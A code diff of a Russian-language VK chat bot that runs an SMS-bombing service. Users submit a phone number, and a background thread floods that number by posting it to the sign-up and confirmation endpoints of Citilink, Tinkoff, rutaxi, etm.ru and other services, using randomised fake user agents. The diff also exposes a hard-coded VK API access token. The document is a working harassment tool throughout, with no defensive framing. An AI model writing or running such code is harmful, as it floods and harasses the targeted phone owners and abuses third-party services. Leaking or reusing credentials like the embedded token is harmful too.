@@ -3,7 +3,7 @@ from termcolor import colored
 from vk_api.longpoll import VkLongPoll, VkEventType
 from vk_api.utils import get_random_id
 from vk_api.keyboard import VkKeyboard, VkKeyboardColor
-
+i=1
 user = fake_useragent.UserAgent().random
 headers = {'user_agent': user}
 p = 0
@@ -53,26 +53,28 @@ for user in UsersId2:
 
 def spam():
     while True:
-        time.sleep(2)
+        time.sleep(10)
+        print('sfsd')
         UsersId = open("baza.txt", "r")
         UsersId2 = set()
         for line in UsersId:
             UsersId2.add(line.strip())
         UsersId.close()
-    
+
         suser = []
         for user in UsersId2:
             suser.append(str(user))
-    
+
         o = 0
-        open(str(event.user_id) + "c.txt", "r")
         for user in suser:
+
             try:
                 userr = str(open(str(user) + "phone.txt", "r").read())
                 write_message(user, '💣 Спам запущен!')
                 write_message(user, "Номер: " f'{userr}' "\nВремя: 30 сек!")
+
                 if 2 > o:
-                    print(userr)
+
                     try:
                         a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + userr + "/", headers=headers)
                         print(colored('citilink-[+]', 'green'))
@@ -157,7 +159,7 @@ def spam():
                         a = requests.post(
                             "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
                             headers=headers,
-    
+
                             data={"phone": "+" + userr})
                         print(colored('tinkoff-[+]', 'yellow'))
                     except:
@@ -165,7 +167,7 @@ def spam():
                     try:
                         a = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",
                                           headers=headers,
-    
+
                                           data={"l": userr[1:]})
                         print(colored('rutaxi-[+]', 'green'))
                     except:
@@ -263,8 +265,8 @@ def spam():
                         print(colored('etm.ru-[+]', 'green'))
                     except:
                         print(colored('etm.ru-[-]', 'green'))
-                else:
-                    file = pathlib.Path(f"{user}room.txt")
+                    
+                    file = pathlib.Path(f"{user}phone.txt")
                     file.unlink()
             except:
                 pass
@@ -326,7 +328,10 @@ def stat2():
     a.write(str(int(baal2) + int(1)))
     a.close()
 
-i=1
+
+t = threading.Thread(target=spam)
+t.start()
+
 token = "f1633eeaccf588d2b2269ec109b63b783581433648776d838a7514b53a9448909664c942251b058138eae"
 authorize = vk_api.VkApi(token=token)
 longpoll = VkLongPoll(authorize)
@@ -348,6 +353,7 @@ for event in longpoll.listen():
                 or reseived_message == 'дарова' and i == 1:
             write_message(sender, "Привет " + name + '! \nРады видеть тебя в нашей группе 😊')
             write_message(sender, "Выбери:")
+
         elif reseived_message[0:10] == 'статистика':
             with open("baal.txt", "r") as baa:
                 baal = baa.read()
@@ -390,6 +396,7 @@ for event in longpoll.listen():
                 a.write(phone)
                 a.close()
                 write_message(sender, 'Ждите вашей очереди!')
+
         elif reseived_message[0:5] == 'назад':
             a = open(str(event.user_id) + "c.txt", "w")
             a.write("1")
